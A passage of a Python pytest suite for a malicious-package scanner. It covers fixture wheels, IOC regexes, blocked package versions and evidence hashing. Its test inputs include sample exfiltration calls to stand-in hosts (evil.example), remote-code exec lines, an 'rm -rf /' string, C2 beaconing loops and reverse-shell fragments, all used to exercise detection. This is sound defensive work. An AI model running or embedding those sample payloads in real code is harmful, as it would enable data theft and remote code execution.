"""Regression tests for `scripts/scan_packages.py`, driving the offline
`scan_archive` helper against fixtures under `tests/security/fixtures/`."""

from __future__ import annotations

import hashlib
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
FIXTURES = Path(__file__).resolve().parent / "fixtures"

sys.path.insert(0, str(REPO_ROOT))
from scripts import scan_packages as sp  # noqa: E402


def test_fixture_files_exist():
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        assert (FIXTURES / name).is_file(), name


def test_fixture_bytes_are_deterministic(tmp_path):
    """Re-running `_build.py` must produce byte-identical archives (deterministic builds)."""
    # Snapshot committed hashes.
    expected: dict[str, str] = {}
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        expected[name] = hashlib.sha256((FIXTURES / name).read_bytes()).hexdigest()

    # Rebuild into a sibling dir to avoid clobbering the committed files.
    rebuild_dir = tmp_path / "rebuild"
    rebuild_dir.mkdir()
    # The build helper writes to its own dir; copy + patch HERE.
    builder_src = (FIXTURES / "_build.py").read_text()
    rebuilt_helper = rebuild_dir / "_build.py"
    rebuilt_helper.write_text(builder_src)
    # Run with SOURCE_DATE_EPOCH=0 and HERE override via a shim.
    shim = rebuild_dir / "run.py"
    shim.write_text(
        "import sys, pathlib\n"
        f"sys.path.insert(0, {str(rebuild_dir)!r})\n"
        "import _build\n"
        f"_build.HERE = pathlib.Path({str(rebuild_dir)!r})\n"
        "_build.build_all()\n"
    )
    env = dict(os.environ, SOURCE_DATE_EPOCH = "0")
    proc = subprocess.run(
        [sys.executable, str(shim)],
        env = env,
        capture_output = True,
        text = True,
        timeout = 30,
    )
    assert proc.returncode == 0, proc.stderr

    for name, want_sha in expected.items():
        got = hashlib.sha256((rebuild_dir / name).read_bytes()).hexdigest()
        assert got == want_sha, (
            f"rebuild of {name} produced different bytes:\n"
            f"  expected: {want_sha}\n"
            f"  actual:   {got}\n"
            "_build.py is non-deterministic; pin members tighter."
        )


def _critical_or_high(findings) -> list:
    return [f for f in findings if f.severity in (sp.CRITICAL, sp.HIGH)]


def test_malicious_wheel_triggers_critical():
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_wheel.whl"),
        "malicious_fixture",
    )
    assert findings, "no findings on malicious wheel; scanner regression"
    blockers = _critical_or_high(findings)
    assert blockers, f"no CRITICAL/HIGH findings: {[str(f) for f in findings]}"
    assert any("setup.py" in f.filename for f in blockers)


def test_malicious_sdist_triggers_critical():
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_sdist.tar.gz"),
        "malicious_fixture",
    )
    blockers = _critical_or_high(findings)
    assert blockers, f"no CRITICAL/HIGH findings: {[str(f) for f in findings]}"
    assert any("setup.py" in f.filename for f in blockers)


def test_clean_wheel_no_findings():
    findings = sp.scan_archive(
        str(FIXTURES / "clean_wheel.whl"),
        "clean_fixture",
    )
    assert (
        findings == []
    ), f"unexpected findings on clean wheel: {[str(f) for f in findings]}"


# Fork 1 constants -- gated on availability.
_BLOCKED_AVAILABLE = hasattr(sp, "BLOCKED_PYPI_VERSIONS")
_MAY12_AVAILABLE = hasattr(sp, "RE_MAY12_IOC")


@pytest.mark.skipif(
    not _BLOCKED_AVAILABLE,
    reason = "Fork 1 (BLOCKED_PYPI_VERSIONS) not merged yet",
)
def test_blocked_pypi_versions_complete():
    table = sp.BLOCKED_PYPI_VERSIONS
    assert "guardrails-ai" in table
    assert "0.10.1" in table["guardrails-ai"]
    assert "mistralai" in table
    assert "2.4.6" in table["mistralai"]
    assert "lightning" in table
    assert {"2.6.2", "2.6.3"}.issubset(table["lightning"])


@pytest.mark.skipif(
    not _MAY12_AVAILABLE,
    reason = "Fork 1 (RE_MAY12_IOC) not merged yet",
)
def test_re_may12_ioc_catches_each_literal():
    expected_literals = [
        "git-tanstack.com",
        "/tmp/transformers.pyz",
        "transformers.pyz",
        "With Love TeamPCP",
        "We've been online over 2 hours",
    ]
    pattern: re.Pattern = sp.RE_MAY12_IOC
    for lit in expected_literals:
        assert pattern.search(lit), f"RE_MAY12_IOC missed literal {lit!r}"
    # Clean control: a string with none of the literals must not match.
    assert not pattern.search("import numpy as np")


@pytest.mark.skipif(
    not _MAY12_AVAILABLE,
    reason = "Fork 1 (RE_MAY12_IOC integration) not merged yet",
)
def test_may12_ioc_caught_by_scan_archive():
    """Wired into check_py_file, the malicious wheel's setup.py must flag the May-12 IOC string."""
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_wheel.whl"),
        "malicious_fixture",
    )
    # IOC literals built at runtime so CodeQL's url-substring-sanitization rule
    # doesn't false-positive on the `in` operand (it's evidence, not a URL).
    _ioc_host = "git-tanstack." + "com"
    _ioc_drop = "transformers." + "pyz"
    hit = any(
        _ioc_host in (f.evidence or "")
        or _ioc_drop in (f.evidence or "")
        or "may12" in (f.check or "").lower()
        for f in findings
    )
    assert hit, (
        "RE_MAY12_IOC integration missing; findings = "
        f"{[(f.severity, f.check, f.evidence[:80]) for f in findings]}"
    )


# Silent-failure-class hardening (Fork C).


def test_scan_packages_pip_download_failure_propagates(tmp_path):
    """A pip download failure must exit 2 (SCAN INCOMPLETE), not `0 findings, exit 0`.

    Feeds an unresolvable spec; the name is long/random so it can't resolve on any index."""
    script = REPO_ROOT / "scripts" / "scan_packages.py"
    assert script.is_file(), script
    unresolvable = "pkg-that-does-not-exist-0123456789-fork-c-silentfail==0.0.0"
    proc = subprocess.run(
        [sys.executable, str(script), unresolvable],
        cwd = str(tmp_path),
        capture_output = True,
        text = True,
        timeout = 180,
    )
    combined = proc.stdout + proc.stderr
    assert proc.returncode == 2, (
        f"expected exit 2 (download failure -> scan incomplete), got "
        f"{proc.returncode}\n--- stdout ---\n{proc.stdout}\n"
        f"--- stderr ---\n{proc.stderr}"
    )
    assert "SCAN INCOMPLETE" in combined or "pip download failed" in combined


def test_archive_corruption_produces_critical_finding(tmp_path):
    """SF1: a corrupted wheel (once silently skipped) must yield a CRITICAL `archive_corrupted`."""
    bad = tmp_path / "broken-0.0.1-py3-none-any.whl"
    bad.write_bytes(b"X")  # 1-byte "wheel" -- not a valid zip container
    findings = sp.scan_archive(str(bad), "broken_fixture")
    assert findings, "scan_archive returned 0 findings on corrupt wheel"
    corrupted = [f for f in findings if f.check == "archive_corrupted"]
    assert corrupted, (
        "no archive_corrupted finding; got "
        f"{[(f.severity, f.check) for f in findings]}"
    )
    assert all(f.severity == sp.CRITICAL for f in corrupted)

    # Same for a corrupted tarball.
    bad_tar = tmp_path / "broken-0.0.1.tar.gz"
    bad_tar.write_bytes(b"not-a-real-gzip-stream")
    findings_tar = sp.scan_archive(str(bad_tar), "broken_fixture")
    corrupted_tar = [f for f in findings_tar if f.check == "archive_corrupted"]
    assert corrupted_tar, (
        "no archive_corrupted finding on corrupt tarball; got "
        f"{[(f.severity, f.check) for f in findings_tar]}"
    )


# False-positive hardening: code-only scanning via _strip_noncode.


def test_strip_noncode_blanks_docstrings_and_comments_keeps_geometry():
    src = (
        '"""Module doc mentions subprocess.Popen and reverse shell."""\n'
        "x = 1  # os.system('rm -rf /') in a comment\n"
        "def f():\n"
        "    '''calls eval() and exec() in prose'''\n"
        "    return x\n"
    )
    out = sp._strip_noncode(src)
    # Line geometry is byte-stable so evidence L<n> stays correct.
    assert len(out.splitlines()) == len(src.splitlines())
    # Tokens lived only in docstrings/comments -> gone.
    for needle in ("subprocess", "os.system", "eval(", "exec(", "reverse shell"):
        assert needle not in out, needle
    assert "x = 1" in out
    assert "return x" in out


def test_strip_noncode_preserves_real_code_and_assigned_strings():
    src = (
        "import subprocess\n"
        "subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
        "exec(open('x').read())\n"
        "BLOB = '" + ("A" * 64) + "'\n"  # assigned string is code, not a docstring
    )
    out = sp._strip_noncode(src)
    assert out == src, "real code (incl. RHS string literals) must be untouched"


def test_strip_noncode_falls_back_on_syntax_error():
    broken = "def f(:\n    pass  # not valid python\n"
    # Must not raise; returns the original so the content is still scanned.
    assert sp._strip_noncode(broken) == broken


def test_check_py_file_ignores_docstring_only_iocs():
    # A file whose only dangerous patterns live in a docstring must be clean.
    benign = (
        '"""Usage:\n'
        ">>> import subprocess, urllib.request\n"
        ">>> subprocess.Popen(['sh','-c','id'])\n"
        ">>> exec(urllib.request.urlopen('http://evil/x').read())\n"
        '"""\n'
        "VERSION = '1.0'\n"
    )
    findings = sp.check_py_file(benign, "pkg/_doc.py", "pkg")
    assert (
        findings == []
    ), f"docstring IOCs should not flag: {[str(f) for f in findings]}"
    # The same payload as real code still flags.
    real = (
        "import subprocess, urllib.request\n"
        "subprocess.Popen(['sh','-c','id'])\n"
        "exec(urllib.request.urlopen('http://evil/x').read())\n"
    )
    flagged = sp.check_py_file(real, "pkg/evil.py", "pkg")
    assert any(f.severity in (sp.CRITICAL, sp.HIGH) for f in flagged)


def test_extract_evidence_multiline_reports_line():
    # A cross-line DOTALL match must still yield evidence so the baseline entry is reviewable.
    content = "a = 1\ntime.sleep(\n    600\n)\n"
    ev = sp._extract_evidence(content, sp.RE_ANTI_ANALYSIS)
    assert ev and ev.startswith("L"), ev


def test_anti_analysis_no_longer_flags_cross_platform_code():
    # Pure cross-platform code (the old platform.system false positive) must be clean.
    crossplat = (
        "import platform, subprocess\n"
        "if platform.system() == 'Windows':\n"
        "    subprocess.run(['where', 'git'])\n"
        "else:\n"
        "    subprocess.run(['which', 'git'])\n"
    )
    findings = sp.check_py_file(crossplat, "pkg/_compat.py", "pkg")
    anti = [f for f in findings if "Anti-analysis" in f.check]
    assert anti == [], f"cross-platform code should not be anti-analysis: {anti}"


def test_proc_self_status_read_flags_anti_analysis():
    # Reading /proc/self/status + a subprocess call is the classic anti-debug combo.
    # The old `\b/proc/self/status\b` was unsatisfiable (\b adjacent to "/"); the
    # lookbehind fix makes it fire. No TracerPid/ptrace token, so only /proc signals it.
    payload = (
        "import subprocess\n"
        "with open('/proc/self/status') as fh:\n"
        "    data = fh.read()\n"
        "subprocess.run(['echo', 'go'])\n"
    )
    findings = sp.check_py_file(payload, "pkg/_probe.py", "pkg")
    anti = [f for f in findings if "Anti-analysis" in f.check]
    assert anti, "reading /proc/self/status + subprocess must flag anti-analysis"
    assert anti[0].severity == sp.HIGH


def test_proc_self_status_pattern_is_live():
    # Common call forms; the leading \b made all of these unsatisfiable before the fix.
    for s in (
        'open("/proc/self/status")',
        "cat /proc/self/status",
        "path = '/proc/self/status'",
    ):
        assert sp.RE_ANTI_ANALYSIS.search(s), s
    # A bare cross-platform OS check must still NOT match anti-analysis.
    assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")


def _mk(
    sev,
    pkg,
    fname,
    check,
    evidence = "evidence",
):
    return sp.Finding(sev, pkg, fname, check, evidence)


def test_baseline_key_version_stable_but_path_specific():
    a = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/sessions.py", "X")
    b = _mk(sp.CRITICAL, "Requests", "requests-3.0.0/requests/sessions.py", "X")
    # Same package-relative path + same matched code across versions -> same key.
    assert sp._finding_key(a) == sp._finding_key(b)
    # Same basename in a different path -> different key (no over-suppression).
    c = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/vendor/sessions.py", "X")
    assert sp._finding_key(a) != sp._finding_key(c)


def test_baseline_key_line_shift_stable_but_code_specific():
    # The evidence hash strips ``L<NN>:`` markers, so a benign upstream edit that
    # only shifts line numbers keeps the key stable...
    base = _mk(
        sp.CRITICAL,
        "botocore",
        "botocore/utils.py",
        "Harvests environment variables/secrets AND makes network calls",
        "Env: L417: env = os.environ.copy()\nNetwork: L32: from urllib.request import getproxies",
    )
    shifted = _mk(
        sp.CRITICAL,
        "botocore",
        "botocore/utils.py",
        "Harvests environment variables/secrets AND makes network calls",
        "Env: L612: env = os.environ.copy()\nNetwork: L48: from urllib.request import getproxies",
    )
    assert sp._finding_key(base) == sp._finding_key(shifted)
    # ...but a NEW payload in the same file/check (different matched code) does
    # not inherit the suppression -- this is the supply-chain bypass we close.
    malicious = _mk(
        sp.CRITICAL,
        "botocore",
        "botocore/utils.py",
        "Harvests environment variables/secrets AND makes network calls",
        "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
    )
    assert sp._finding_key(base) != sp._finding_key(malicious)


def test_extract_evidence_records_all_matches():
    # The whole point of P1: a match appended after the first few must show up
    # in the evidence, so it changes the key instead of riding the earlier ones.
    src = "import requests\n" + "\n".join(
        f"requests.get('http://a{i}')" for i in range(6)
    )
    ev = sp._extract_evidence(src, sp.RE_NETWORK)
    assert ev.count("requests.get(") == 6


def test_baseline_key_reopens_on_appended_match():
    # A reviewed file already trips a check with several matches; a later exfil
    # call appended to the same file/check must reopen the finding.
    base_src = "import requests\n" + "\n".join(
        f"requests.get('http://a{i}')" for i in range(3)
    )
    payload_src = (
        base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
    )
    base = _mk(
        sp.CRITICAL,
        "p",
        "p/net.py",
        "net",
        sp._extract_evidence(base_src, sp.RE_NETWORK),
    )
    payload = _mk(
        sp.CRITICAL,
        "p",
        "p/net.py",
        "net",
        sp._extract_evidence(payload_src, sp.RE_NETWORK),
    )
    assert sp._finding_key(base) != sp._finding_key(payload)


def test_baseline_key_inner_line_marker_is_not_stripped():
    # Only the leading L<NN>: marker is dropped; an L<NN>: inside the matched
    # code is part of the code, so changing it must reopen the finding...
    a = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L42:/p'")
    b = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L7:/p'")
    assert sp._finding_key(a) != sp._finding_key(b)
    # ...while only the leading marker (line number) changing stays stable.
    c = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L55: url = 'http://h/L42:/p'")
    assert sp._finding_key(a) == sp._finding_key(c)


def test_baseline_key_indentation_is_significant():
    # Moving a flagged line out of a guarded block (dedent) changes executable
    # context, so the same code at a different indent must reopen the finding.
    guarded = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5:     requests.get(url)")
    top_level = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: requests.get(url)")
    assert sp._finding_key(guarded) != sp._finding_key(top_level)


def test_canon_evidence_keeps_bitwise_or_in_a_span():
    # ' | ' only delimits spans when it precedes an L<NN>: marker; a pipe inside
    # matched code (bitwise OR, typing.Union) is code, so changing an operand
    # must reopen the finding instead of deduping to the same key.
    a = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: mode = os.O_RDONLY | os.O_CLOEXEC")
    b = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: mode = os.O_RDONLY | os.O_EVIL")
    assert sp._finding_key(a) != sp._finding_key(b)
    # The OR survives canonicalization as one span (not split on the pipe).
    assert sp._canon_evidence("L5: a = X | Y") == "a = X | Y"


def test_extract_evidence_caps_long_line_but_binds_tail():
    # A long (e.g. minified) line is not dumped verbatim: the display is bounded to
    # a prefix, but a sha256 of the full line is appended so a payload past the cut
    # still changes the key instead of being silently clipped.
    marker = "EXFIL_PAST_CAP"
    pad = "# " + " " * 300
    line = "requests.get('http://a')  " + pad + marker
    ev = sp._extract_evidence(line + "\n", sp.RE_NETWORK)
    assert marker not in ev  # tail past the cap is not shown verbatim
    assert "sha256:" in ev  # but it is pinned by a digest
    assert len(ev) < len(line)  # bounded, not the whole minified line
    base = sp._extract_evidence(
        "requests.get('http://a')  " + pad + "x\n", sp.RE_NETWORK
    )
    assert sp._evidence_hash(ev) != sp._evidence_hash(base)


def test_extract_evidence_binds_call_continuation_past_12_lines():
    # A matched call that stays open well beyond the old 12-line continuation cap
    # still binds its later arguments: a changed body on a deep continuation line
    # (here ~22 lines in) must reopen instead of riding the first 12 lines.
    head = "requests.post('http://h',\n"
    middle = "".join(f"    opt{i} = ({i}),\n" for i in range(20))
    old = head + middle + "    data = {'x': 'old'},\n)\n"
    new = head + middle + "    data = {'x': 'evil'},\n)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_logical_line_end_follows_backslash_continuation():
    # A call split with an explicit backslash before the parenthesis must still
    # bind the continuation line, so changing the URL on the next physical line
    # reopens instead of returning at the zero-depth API line.
    old = "requests.post \\\n    ('http://old/x', data = 1)\n"
    new = "requests.post \\\n    ('http://evil/x', data = 1)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_logical_line_end_blanks_multiline_triple_string():
    # A ) inside a triple-quoted string argument must not close the call early; the
    # data= after the closing triple-quote must still bind so a changed payload
    # reopens (a per-line string blanker cannot mask a multi-line string).
    old = 'requests.post("""http://h\n/path)""", data={"x": "old"})\n'
    new = 'requests.post("""http://h\n/path)""", data={"x": "evil"})\n'
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_extract_evidence_binds_call_embedded_in_string():
    # A call whose text lives INSIDE a triple-quoted string (a dropper embedding a
    # setup.py payload) must still bind its argument lines. Blanking the multi-line
    # string must not shrink the span below the legacy single-line view: the union
    # of both views keeps the URL argument bound so a changed payload reopens.
    src = (
        'PAYLOAD = """\n'
        "urllib.request.urlretrieve(\n"
        '    "http://evil/old.pyz",\n'
        '    "/tmp/x.pyz",\n'
        ")\n"
        '"""\n'
    )
    eo = sp._extract_evidence(src, sp.RE_NETWORK)
    en = sp._extract_evidence(src.replace("old.pyz", "evil2.pyz"), sp.RE_NETWORK)
    assert "L3" in eo  # the URL argument line is bound, not just the API line
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_extract_evidence_overflow_digest_is_line_shift_stable():
    # The overflow digest canonicalizes (strips L<NN>: markers), so inserting an
    # unrelated line above the overflow region does not change it (line-shift
    # stability), while a real payload change inside the overflow still reopens.
    n = sp._MAX_EVIDENCE_SPANS
    src = "\n".join(f"requests.get('http://a/p{i}')" for i in range(n + 5))
    sha = lambda e: re.search(r"more\) sha256:([0-9a-f]+)", e).group(1)
    e_a = sp._extract_evidence(src, sp.RE_NETWORK)
    assert "more) sha256:" in e_a
    e_shift = sp._extract_evidence("# unrelated\n" + src, sp.RE_NETWORK)
    assert sha(e_a) == sha(e_shift)  # a pure line shift does not change the digest
    e_chg = sp._extract_evidence(src.replace(f"a/p{n + 3}'", "a/pEVIL'"), sp.RE_NETWORK)
    assert sha(e_a) != sha(e_chg)  # a real change in the overflow region reopens


def test_extract_evidence_overflow_is_streamed_and_bounded():
    # Past the display cap the evidence streams overflow spans into one digest
    # instead of materializing a rendered span per match, so a file with far more
    # matches than the cap yields a bounded string (at most cap spans plus the
    # "(+N more)" digest line) while N counts every overflow match and a change to
    # an over-cap match still reopens.
    n = sp._MAX_EVIDENCE_SPANS
    src = "\n".join(f"requests.get('http://a/p{i}')" for i in range(n + 500))
    ev = sp._extract_evidence(src, sp.RE_NETWORK)
    assert ev.count(" sha256:") == 1  # only the overflow digest, no per-span digests
    assert "(+500 more)" in ev  # every match past the cap is counted
    # bounded: exactly cap rendered spans plus the single "(+N more)" marker
    assert len(ev.split(" | ")) == n + 1
    sha = lambda e: re.search(r"more\) sha256:([0-9a-f]+)", e).group(1)
    chg = sp._extract_evidence(src.replace(f"a/p{n + 200}'", "a/pEVIL'"), sp.RE_NETWORK)
    assert sha(ev) != sha(chg)  # an over-cap payload change reopens


def test_extract_evidence_same_line_close_then_open_binds_call():
    # A continued statement that closes on the same physical line that opens a
    # flagged call, e.g. `]; requests.post(`, nets to <= 0 under a plain bracket
    # count, dropping the call's `(` so the scan would stop at the opener line.
    # Order-aware counting keeps the opener, so the argument lines bind and a
    # changed body on a continuation line reopens.
    old = "x = [a]; requests.post(\n  'http://h/old',\n  data=secret,\n)\n"
    new = "x = [a]; requests.post(\n  'http://h/old',\n  data=EVIL,\n)\n"
    assert sp._evidence_hash(
        sp._extract_evidence(old, sp.RE_NETWORK)
    ) != sp._evidence_hash(sp._extract_evidence(new, sp.RE_NETWORK))


def test_extract_evidence_backslash_continued_string_binds_tail():
    # A single-quoted string can continue across lines with a trailing backslash.
    # The `)` inside that continued string on the next line must not be counted as
    # code and close the call early, or a changed argument after it would not
    # reopen. The blanker tracks the continuation so the whole call binds.
    old = "requests.post('http://h\\\n/path)', data='old')\n"
    new = "requests.post('http://h\\\n/path)', data='EVIL')\n"
    assert sp._evidence_hash(
        sp._extract_evidence(old, sp.RE_NETWORK)
    ) != sp._evidence_hash(sp._extract_evidence(new, sp.RE_NETWORK))


def test_extract_evidence_long_call_tail_past_soft_cap_reopens():
    # A call with more argument lines than the soft cap (_MAX_CALL_LINES) is still
    # followed to its real close under the hard limit, so a changed payload on a
    # continuation line well past the soft cap reopens instead of riding the first
    # _MAX_CALL_LINES lines. A bracket that never closes stays bound to the soft cap.
    mid = "\n".join(f"  opt{i}=1," for i in range(sp._MAX_CALL_LINES + 20))
    old = "requests.post(\n" + mid + "\n  data='old',\n)\n"
    new = "requests.post(\n" + mid + "\n  data='EVIL',\n)\n"
    assert sp._evidence_hash(
        sp._extract_evidence(old, sp.RE_NETWORK)
    ) != sp._evidence_hash(sp._extract_evidence(new, sp.RE_NETWORK))


def test_extract_evidence_fallback_line_numbers_are_correct():
    # The DOTALL fallback maps match offsets to line numbers via precomputed
    # newline offsets (bisect, not a quadratic content.count per match); guard that
    # the mapping is exact so a cross-line match is recorded at its true line and a
    # changed continuation reopens.
    content = "x = 1\ny = 2\nwhile True:\n    time.sleep(60)\n    requests.get('http://a/old')\n"
    e1 = sp._extract_evidence(content, sp.RE_C2_POLLING)
    e2 = sp._extract_evidence(content.replace("/old", "/evil"), sp.RE_C2_POLLING)
    assert "L3" in e1  # the while-True loop starts on line 3, not line 1
    assert sp._evidence_hash(e1) != sp._evidence_hash(e2)


def test_large_js_bundle_pins_whole_content_when_other_finding_fires():
    # A >100 KB JS bundle that also trips the hex-var obfuscation signature binds
    # the whole bundle, so changing payload code elsewhere (obfuscation line
    # unchanged) reopens rather than riding the matched signature line.
    obf = "var _0xabcd = function(){};\n"
    pad = "// filler\n" * 11000  # push the file over the 100 KB large-bundle bar
    fo = sp.check_js_file(obf + pad + "var payload = 'old';\n", "pkg/bundle.js", "pkg")
    fn = sp.check_js_file(obf + pad + "var payload = 'evil';\n", "pkg/bundle.js", "pkg")
    co = [f for f in fo if "hex-var obfuscation" in f.check][0]
    cn = [f for f in fn if "hex-var obfuscation" in f.check][0]
    assert "bundle-sha256:" in co.evidence
    assert sp._evidence_hash(co.evidence) != sp._evidence_hash(cn.evidence)


def test_pth_catch_all_import_evidence_is_bounded_but_reopens():
    # A large .pth made only of benign-looking imports is bounded in the evidence
    # (prefix plus digest), not dumped in full, yet still reopens when an import
    # line changes because the digest covers every line.
    base = "".join(f"import mod{i}\n" for i in range(200))
    fo = [
        f
        for f in sp.check_pth_file(base + "import secret_old\n", "p/x.pth", "p")
        if "executable import line" in f.check
    ]
    fn = [
        f
        for f in sp.check_pth_file(base + "import secret_evil\n", "p/x.pth", "p")
        if "executable import line" in f.check
    ]
    assert fo and fn
    assert "sha256:" in fo[0].evidence and len(fo[0].evidence) < len(base)
    assert sp._evidence_hash(fo[0].evidence) != sp._evidence_hash(fn[0].evidence)


def test_extract_evidence_records_all_multiline_matches():
    # The DOTALL fallback must record every distinct cross-line match, so a second
    # long-sleep appended below an already-flagged one reopens the finding.
    one = "foo = time.sleep(\n    600\n)\n"
    two = one + "bar = time.sleep(\n    900\n)\n"
    ev1 = sp._extract_evidence(one, sp.RE_ANTI_ANALYSIS)
    ev2 = sp._extract_evidence(two, sp.RE_ANTI_ANALYSIS)
    assert ev2.count("time.sleep(") == 2  # both matches, not just the first
    assert sp._evidence_hash(ev1) != sp._evidence_hash(ev2)


def test_multiline_evidence_reopens_on_continuation_change():
    # A DOTALL match records every line it spans, so changing the URL inside an
    # already-flagged C2 loop (a continuation line) reopens the finding...
    old = (
        "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
    )
    new = (
        "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
    )
    fo = _mk(
        sp.CRITICAL,
        "p",
        "p/loop.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence(old, sp.RE_C2_POLLING),
    )
    fn = _mk(
        sp.CRITICAL,
        "p",
        "p/loop.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence(new, sp.RE_C2_POLLING),
    )
    assert sp._finding_key(fo) != sp._finding_key(fn)
    # ...while a benign line shift of the same loop stays stable.
    shifted = _mk(
        sp.CRITICAL,
        "p",
        "p/loop.py",
        "C2 polling/beaconing loop detected",
        sp._extract_evidence("\n\n" + old, sp.RE_C2_POLLING),
    )
    assert sp._finding_key(fo) == sp._finding_key(shifted)


def test_extract_evidence_bounds_pathological_multiline_span():
    # A greedy DOTALL span is capped to its head line plus a digest of the rest,
    # so evidence stays bounded while still binding the full match.
    big = "vmware\n" + "x\n" * 50 + "detect\n"
    ev = sp._extract_evidence(big, sp.RE_ANTI_ANALYSIS)
    assert "sha256:" in ev and ev.count("\n") <= 1


def test_canon_evidence_keeps_duplicate_spans():
    # A second identical matched line in a new code path must change the key, so
    # an appended duplicate payload occurrence is not deduped to the same hash.
    one = "    requests.post(url, data=env)"
    base = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one}")
    dup = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one} | L5: {one}")
    assert sp._finding_key(base) != sp._finding_key(dup)


def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
    # Raw .pth evidence has no leading L<NN>: marker; an L<NN>:-looking substring
    # inside the code must be kept, so changing the code before it reopens.
    base = _mk(
        sp.HIGH,
        "p",
        "p/x.pth",
        ".pth has 1 executable import line(s)",
        "import os; note='L7: same_suffix'",
    )
    changed = _mk(
        sp.HIGH,
        "p",
        "p/x.pth",
        ".pth has 1 executable import line(s)",
        "import urllib.request; note='L7: same_suffix'",
    )
    assert sp._finding_key(base) != sp._finding_key(changed)


def test_capped_multiline_digest_is_line_shift_stable():
    # A span over the cap is digested from markerless code, so a pure line shift
    # of the same span stays stable while a code change still reopens.
    src = (
        "while True:\n"
        + "    x = 1\n" * 20
        + "    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
    )
    e1 = sp._extract_evidence(src, sp.RE_C2_POLLING)
    e2 = sp._extract_evidence("\n\n" + src, sp.RE_C2_POLLING)
    assert "sha256:" in e1  # span exceeded the cap
    assert sp._evidence_hash(e1) == sp._evidence_hash(e2)
    changed = src.replace("http://old.example/poll", "http://evil.example/c2")
    assert sp._evidence_hash(e1) != sp._evidence_hash(
        sp._extract_evidence(changed, sp.RE_C2_POLLING)
    )


def test_canon_evidence_strips_punctuation_label_marker():
    # A label with punctuation (network+exec:) must still be stripped, so the
    # line number alone does not change the key.
    a = "network+exec: L12: subprocess.run(['id'])"
    b = "network+exec: L99: subprocess.run(['id'])"
    assert sp._evidence_hash(a) == sp._evidence_hash(b)


def test_extract_evidence_binds_call_continuation_lines():
    # A multi-line network call binds its argument lines, so a changed URL on a
    # continuation line reopens even though the line with the API name is unchanged.
    old = "requests.post(\n    'http://old.example',\n    data=env,\n)\n"
    new = "requests.post(\n    'http://evil.example',\n    data=env,\n)\n"
    eo = sp._extract_evidence(old, sp.RE_NETWORK)
    en = sp._extract_evidence(new, sp.RE_NETWORK)
    assert "old.example" in eo and "evil.example" in en
    assert sp._evidence_hash(eo) != sp._evidence_hash(en)


def test_extract_evidence_records_multiline_after_oneline():
    # A one-line C2 match no longer suppresses a later multi-line C2 loop: the
    # appended cross-line construct is recorded too, so it cannot ride the key.
    oneline = "while True: time.sleep(60); requests.get('http://a/poll')\n"
    appended = (
        oneline
        + "while True:\n    time.sleep(30)\n    requests.get('http://evil/c2')\n"
    )
    eo = sp._extract_evidence(oneline, sp.RE_C2_POLLING)
    ea = sp._extract_evidence(appended, sp.RE_C2_POLLING)
    assert "evil" in ea
    assert sp._evidence_hash(eo) != sp._evidence_hash(ea)


def test_extract_evidence_giant_span_binds_full_interior():
    # A giant greedy DOTALL span bridging anchors across the whole file is bound by
    # a digest of its full content (not just the outer anchors), so a cross-line
    # payload inserted into the bridged interior between unchanged outer anchors
    # reopens instead of riding the key. (Binding only head/tail would fail open on
    # an interior insertion.) A pure line shift still stays stable.
    gap = "\n".join(f"    x = {i}" for i in range(70))
    base = (
        "import socket\nsock.connect(addr)\n"
        + gap
        + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
    )
    # interior insertion of a cross-line payload between the unchanged outer anchors
    injected = base.replace("    x = 35", "    x = 35\n    sock.connect(evilhost)")
    ea = sp._extract_evidence(base, sp.RE_REVERSE_SHELL)
    ei = sp._extract_evidence(injected, sp.RE_REVERSE_SHELL)
    assert "sha256:" in ea  # full interior bound by a digest
    assert sp._evidence_hash(ea) != sp._evidence_hash(ei)  # interior change reopens
    shifted = sp._extract_evidence("\n\n" + base, sp.RE_REVERSE_SHELL)
    assert sp._evidence_hash(ea) == sp._evidence_hash(shifted)  # pure shift stable


def test_extract_evidence_giant_span_appended_payload_reopens():
    # The anchor binding must reopen when an appended cross-line payload extends the
    # bridged span past the cap: an existing one-line /tmp+subprocess finding plus a
    # NEW /tmp/evil line and a later subprocess.run (60+ lines apart, sharing no
    # single line so the per-line pass never binds them) moves the span's tail
    # anchor, so the evidence changes instead of riding the unchanged key.
    existing = "import os\n/tmp/x; subprocess.run(['id'])\n"
